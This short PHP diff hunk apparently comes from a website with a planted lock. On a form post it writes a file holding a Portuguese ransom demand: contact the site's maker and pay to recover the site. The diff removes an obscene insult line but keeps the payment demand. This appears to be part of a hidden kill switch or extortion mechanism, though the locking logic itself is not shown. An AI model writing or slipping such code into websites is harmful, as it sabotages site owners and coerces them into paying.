@@ -35,7 +35,6 @@ if(isset($_POST['f_btn'])){
 
     if(!file_exists($fileProv) || !is_file($fileProv)){
         $fileOpen = fopen($fileProv, "w");
-        fwrite($fileOpen, "Quer dá golpe se fodeu filho da puta".PHP_EOL);
         fwrite($fileOpen, "entra em contato com quem fez o site, realiza o pagamento para recuperar seu site devolta!".PHP_EOL);
         fclose($fileOpen);
 
